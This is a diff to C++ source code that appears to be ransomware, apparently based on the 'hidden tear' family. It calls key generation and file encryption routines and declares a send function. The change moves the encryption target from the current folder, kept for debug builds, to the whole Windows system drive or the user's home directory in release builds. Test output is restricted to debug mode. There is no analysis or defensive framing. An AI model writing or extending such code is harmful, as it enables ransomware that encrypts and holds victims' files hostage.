@@ -1,5 +1,6 @@
 #include <iostream>
 #include <string>
+#include <stdexcept>
 
 #include "config.h"
 #include "tear.h"
@@ -23,13 +24,34 @@ string get_username();
 void send();
 
 int main(int argc, char* argv[]) {
-	iterate(".");
-
-	cout << "Username: " << get_username() << endl;
-
 	crypt_data* d = generatekey();
 
 #ifdef DEBUG
+	string path = ".";
+#elif defined(_WIN32)
+	string path;
+
+	char* drive = getenv("SystemDrive");
+	if (drive == nullptr) {
+		throw runtime_error("SystemDrive environment variable not found");
+	} else {
+		path = drive;
+	}
+#else
+	string path;
+
+	char* drive = getenv("HOME");
+	if (drive == nullptr) {
+		throw runtime_error("HOME environment variable not found");
+	} else {
+		path = drive;
+	}
+#endif
+
+	iterate(path);
+
+#ifdef DEBUG
+	cout << "Username: " << get_username() << endl;
 	encrypt(d, "./README.md");
 #endif
 
